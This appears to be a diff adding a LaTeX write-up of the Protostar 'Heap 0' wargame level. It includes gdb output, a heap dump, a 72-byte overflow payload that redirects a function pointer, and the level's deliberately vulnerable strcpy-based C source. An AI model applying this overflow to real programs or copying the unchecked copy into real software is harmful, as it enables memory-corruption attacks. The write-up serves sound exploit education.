@@ -1,0 +1,112 @@
+
+\begin{center}\begin{LARGE}Heap 0\end{LARGE}\end{center}
+ 
+\subsection*{Problem}
+
+We know that heap and stack are very similar, where the memory allocation
+is contiguous. We can use a similar approach to solving stack questions.
+
+\begin{lstlisting}[language=bash]
+print &nowinner
+>>>$1 = (void (*)(void)) 0x8048478 <nowinner>
+print &winner
+>>>$2 = (void (*)(void)) 0x8048464 <winner>
+\end{lstlisting}
+
+We can locate the address of the function \code{nowinner} through gdb which
+we will use to locate its address on the heap. We can be sure that the address
+is on the heap because of how the struct \code{fp} is created during runtime
+with malloc. Similar to the attack on stack, we will inject the target function
+address into the heap to redirect the call.
+
+\subsection*{Idea and Attack process}
+
+\begin{lstlisting}[language=bash]
+info proc map
+>>>process 2170
+>>>cmdline = '/opt/protostar/bin/heap0'
+>>>cwd = '/opt/protostar/bin'
+>>>exe = '/opt/protostar/bin/heap0'
+>>>Mapped address spaces:
+>>>
+>>>        Start Addr   End Addr       Size     Offset objfile
+>>>         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap0
+>>>         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap0
+>>>         0x804a000  0x806b000    0x21000          0           [heap]
+>>>        0xb7e96000 0xb7e97000     0x1000          0
+>>>        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
+>>>        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
+>>>        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
+>>>        0xb7fd9000 0xb7fdc000     0x3000          0
+>>>        0xb7fe0000 0xb7fe2000     0x2000          0
+>>>        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
+>>>        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
+>>>        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
+>>>        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
+
+x/30x 0x804a000
+>>>0x804a000:      0x00000000      0x00000049      0x61616161      0x00000000
+>>>0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
+>>>0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
+>>>0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
+>>>0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
+>>>0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
+>>>0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
+>>>0x804a070:      0x00000000      0x00000000
+\end{lstlisting}
+
+We find out the location address of the heap first and we examine the memory content
+to get the offset needed to inject the target address. On examination we find out
+that we need 72 bytes.
+
+\begin{lstlisting}[language=bash]
+./heap0 $(python -c "print 'A'*72 + '\x64\x84\x04\x08'")
+>>>data is at 0x804a008, fp is at 0x804a050
+>>>level passed
+\end{lstlisting}
+
+\subsection*{Source code}
+
+\begin{lstlisting}[language=c]
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdio.h>
+#include <sys/types.h>
+
+struct data {
+  char name[64];
+};
+
+struct fp {
+  int (*fp)();
+};
+
+void winner()
+{
+  printf("level passed\n");
+}
+
+void nowinner()
+{
+  printf("level has not been passed\n");
+}
+
+int main(int argc, char **argv)
+{
+  struct data *d;
+  struct fp *f;
+
+  d = malloc(sizeof(struct data));
+  f = malloc(sizeof(struct fp));
+  f->fp = nowinner;
+
+  printf("data is at %p, fp is at %p\n", d, f);
+
+  strcpy(d->name, argv[1]);
+  
+  f->fp();
+
+}
+\end{lstlisting}
